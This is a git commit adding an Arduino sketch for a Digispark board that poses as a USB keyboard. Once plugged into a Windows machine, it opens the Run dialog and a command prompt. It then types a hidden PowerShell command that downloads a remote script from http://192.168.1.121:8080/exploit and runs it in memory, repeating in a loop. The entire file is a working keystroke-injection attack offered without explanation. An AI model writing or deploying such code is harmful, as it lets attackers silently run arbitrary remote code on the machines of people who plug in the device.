18322266bf14315712557ead4bbde5726cf6dbf2
Codetd <44204244+Codetd@users.noreply.github.com>
2018-10-16 15:58:49 +0100

    Add files via upload

---
+++ test.ino
@@ -0,0 +1,18 @@
+#include "DigiKeyboard.h"
+ 
+void setup() {
+} 
+void loop() {
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.println("cmd");
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000);
+DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.121:8080/exploit');");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(5000);
+ 
+}
